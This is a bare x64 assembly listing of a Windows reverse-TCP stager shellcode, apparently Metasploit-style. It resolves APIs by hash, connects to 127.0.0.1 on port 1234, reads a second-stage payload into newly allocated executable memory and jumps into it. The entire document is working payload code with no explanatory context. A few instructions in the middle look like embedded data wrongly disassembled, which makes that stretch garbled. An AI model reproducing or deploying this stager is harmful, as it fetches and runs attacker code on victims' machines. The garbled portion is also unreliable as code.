```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    push r8
    push rdx
    push rcx
    push rsi
    xor rdx, rdx
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
L_21:
    xor r9, r9
    movzx rcx, word ptr [rdx + 0x4a]
    mov rsi, qword ptr [rdx + 0x50]
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    push rdx
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    push r9
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    push rax
    mov ecx, dword ptr [rax + 0x18]
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
L_72:
    jrcxz L_ca
    xor r9, r9
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
L_81:
    xor rax, rax
    ror r9d, 0xd
    lodsb al, byte ptr [rsi]
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    add rax, rdx
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_d6:
    pop rbp
    movabs r14, 0x32335f327377
    push r14
    mov r14, rsp
    sub rsp, 0x1a0
    mov r13, rsp
    movabs r12, 0x100007fd2040002
    push r12
    mov r12, rsp
    mov rcx, r14
    mov r10d, 0x726774c
    call rbp
    mov rdx, r13
    push 0x101
    pop rcx
    mov r10d, 0x6b8029
    call rbp
    push 0xa
    pop r14
L_11f:
    push rax
    push rax
    xor r9, r9
    xor r8, r8
    inc rax
    mov rdx, rax
    inc rax
    mov rcx, rax
    mov r10d, 0xe0df0fea
    call rbp
    mov rdi, rax
L_13e:
    push 0x10
    pop r8
    mov rdx, r12
    mov rcx, rdi
    mov r10d, 0x6174a599
    call rbp
    test eax, eax
    je L_15e
    dec r14
    jne L_13e
    call L_21a
L_15e:
RET_15e:
    xor r9, r9
    push 0x10
L_163:
    pop r8
    call L_17a
    out dx, al
    out dx, eax
    vmaxss xmm14, xmm9, dword ptr [rdi + 0x7d491410]
    jg L_198
    jbe L_163
    rcr byte ptr [rdx + 0x48], 0x89
    stc
    mov r10, 0x5f38ebc2
    call rbp
    sub rsp, 0x10
    mov rdx, rsp
    xor r9, r9
    push 4
    pop r8
    mov rcx, rdi
L_198:
    mov r10d, 0x5fc8d902
    call rbp
    cmp eax, 0
    jle L_1fa
    add rsp, 0x20
    pop rsi
    mov esi, esi
    push 0x40
    pop r9
    push 0x1000
    pop r8
    mov rdx, rsi
    xor rcx, rcx
    mov r10d, 0xe553a458
    call rbp
    mov rbx, rax
    mov r15, rax
L_1cb:
    xor r9, r9
    mov r8, rsi
    mov rdx, rbx
    mov rcx, rdi
    mov r10d, 0x5fc8d902
    call rbp
    cmp eax, 0
    jge L_20c
    pop rax
    push r15
    pop rcx
    push 0x4000
    pop r8
    push 0
    pop rdx
    mov r10d, 0x300f2f0b
    call rbp
L_1fa:
    push rdi
    pop rcx
    mov r10d, 0x614d6e75
    call rbp
    dec r14
    jmp L_11f
L_21a:
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
L_20c:
    add rbx, rax
    sub rsi, rax
    test rsi, rsi
    jne L_1cb
    jmp r15
.equ L_17a, L_163 + 0x17
```